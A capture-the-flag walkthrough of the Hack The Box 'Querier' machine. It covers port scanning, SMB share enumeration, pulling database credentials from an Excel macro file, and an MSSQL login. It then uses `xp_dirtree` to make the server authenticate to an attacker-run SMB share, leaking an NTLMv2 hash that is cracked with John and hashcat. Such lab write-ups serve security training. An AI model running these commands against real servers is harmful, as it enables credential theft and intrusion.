### HTB Querier   10.10.10.125

Welcome back to another HTB takedown.  This time we're going after Querier.

So let's get started.  Once again, as always, the good ol nmap.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.125                        
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 08:38 EST
Nmap scan report for 10.10.10.125
Host is up (0.058s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.97 seconds
```

A couple of ports to peed at, let's give those a go.

```
(kali@kali)-$ sudo nmap -A -Pn -p 135,139,445,1433,5985,47001 10.10.10.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 08:40 EST
Nmap scan report for 10.10.10.125
Host is up (0.049s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-06T13:34:15
|_Not valid after:  2054-11-06T13:34:15
|_ssl-date: 2024-11-06T13:40:41+00:00; +1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows 7 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-06T13:40:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   43.17 ms 10.10.14.1
2   56.81 ms 10.10.10.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.31 seconds
```

So, looks like we have SMB and SQL.  Let's try smb first.

```
(kali@kali)-$ smbclient -L \\\\10.10.10.125\\    
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

Looks like Reports is the one we're gonna take a look at.  Of course, try them all but Reports looks like our winner.

```
(kali@kali)-$ smbclient \\\\10.10.10.125\\Reports
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                5158399 blocks of size 4096. 826798 blocks available
smb: \> cd ..
smb: \> pwd
Current directory is \\10.10.10.125\Reports\
smb: \> cd ..
smb: \> pwd
Current directory is \\10.10.10.125\Reports\
smb: \> get Currency Volume Report.xlsm 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Currency
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (53.8 KiloBytes/sec) (average 53.8 KiloBytes/sec)
```

And it was.  Went ahead and grabbed the file that was there.  And this was where I got stuck and had to go look.  So turns out, you can unzip .xlsm files.  So did that and what I got was this...

```
(kali@kali)-$ unzip Currency\ Volume\ Report.xlsm                        
Archive:  Currency Volume Report.xlsm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/theme/theme1.xml     
  inflating: xl/styles.xml           
  inflating: xl/vbaProject.bin       
  inflating: docProps/core.xml       
  inflating: docProps/app.xml
```

In a pentest, we would look through all of these, and I did.  I found an assortment of things in the xml files but nothing caught my eye.  So, stuck again, I went back to the video to find another trick I didn't know about.  HTB had me do the `strings` command on the .bin file.  The video had me `cat` out the file.  The `string` command gave it to me in a long skinny string of text while the `cat` command printed it out much more readable.  I think I like the `cat` command better.

![cat bin file](/Images/HTB9Querier/pic1.png)

Here we have the a Uid and a Pwd.  Let's see where that gets us.  I remember we had a ms-sql server running.  Let's give that a go.

```
(kali@kali)-$ mssqlclient.py QUERIER/reporting:'<password>'@10.10.10.125 -windows-auth                   
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

So we used `mssqlclient.py` with the domain/username with the password that we grabbed @ the IP address.  Then we specified the `-windows-auth` as our login type.  And that got us in here.

At this point, tried running `enable_xp_cmdshell` and it did not work.

```
SQL> enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL> 
```

So looks like we don't have permission for that.  But what we can also try is this.

```
(kali@kali)-$ smbserver.py -smb2support share share/
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

So we start up an SMB server on our machine.  And using the same principle as responder to grab hash credentials, we can initiate a connection from the sql server.

```
SQL> exec xp_dirtree '\\10.10.14.31\share'
subdirectory                                                                                                                                                                                                                                                            depth   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   
```

Once we run that command, go back to the smb server running and we see the following.

![Hash](/Images/HTB9Querier/pic2.png)

And we have our NTLMv2 hash.

Now that we have a hash, we can go one of a couple ways.  We can use hash cat or any number of hash cracking tools.  Take the hash and save it into a text file.

To use John the Ripper, we do the following.

`john --format=netntlmv2 ntlmhash.txt --wordlist=/usr/share/wordlists/rockyou.txt`

This gives us the following output.

![John result](/Images/HTB9Querier/pic3.png)

We can also use HashCat.

`hashcat-6.2.6>hashcat.exe hash.txt rockyou.txt -O`

![Hashcat Result](/Images/HTB9Querier/pic4.png)

Took a sec to get hashcat working, had to try a few different ways but got it to work.





